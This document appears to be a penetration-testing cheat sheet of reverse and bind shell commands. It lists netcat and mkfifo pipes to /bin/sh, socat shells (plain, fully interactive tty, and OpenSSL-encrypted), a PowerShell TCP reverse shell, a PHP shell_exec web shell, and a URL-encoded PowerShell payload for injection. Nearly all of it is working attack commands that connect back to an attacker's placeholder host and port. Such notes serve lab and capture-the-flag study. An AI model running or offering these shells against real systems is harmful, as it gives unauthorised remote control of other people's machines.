### Reverse shells

#### Netcat

Reverse shell listener: `nc -nlvp <port number>`

Connect back: `nc <ip address> <port number>`
Another command to connect back: `mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`

Bind shell:

Starting a listener in a Windows target: `nc -lvnp <PORT> -e /bin/bash`
Starting a listener in a Linux target: `mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`

### rlwrap

Description: Gives a more interactive shell, useful for Windows target

Reverse shell listener: `rlwrap nc -nlvp <port number>`

Connecting to the listener: `nc <ip address> <port number>`

### Socat

#### Reverse shell

Reverse shell listener: `socat TCP-L:<port> -`

Connect back:
In Windows: `socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes`
In Linux: `socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"`

#### Bind shell

In Windows target: `socat TCP-L:<PORT> EXEC:powershell.exe,pipes`
In Linux target: `socat TCP-L:<PORT> EXEC:"bash -li"`

Connecting: `socat TCP:<TARGET-IP>:<TARGET-PORT> -`

#### Fully stable Linux tty reverse shell

Reverse shell listener: `socat TCP-L:<port> FILE:`tty`,raw,echo=0`

Get [precompiled socat binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true) to the target's machine if the target doesn't have Socat installed

Connect back: `socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane`

#### Encrypted shell

1. Generate a certificate in the attacking machine: `openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt`
2. Convert the 2 created files into a single `.pem` file: `cat shell.key shell.crt > shell.pem`
3. Set up the reverse shell listener: `socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -`
4. Connect back: `socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash`

Bind encrypted shell:

Target: `socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes`
Attacker: `socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -`

### Powershell

Connect to a netcat listener: `powershell -c "$client = New-Object System.Net.Sockets.TCPClient('**<ip>**',**<port>**);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`

### Webshell

Shell that let's you execute commands: `<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>`

PHP shell(won't work for Windows target by default): [PentestMonkey php-reverse-shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php)

Power shell encrypted shell for Windows target (can be used as a CMD argument): `powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22`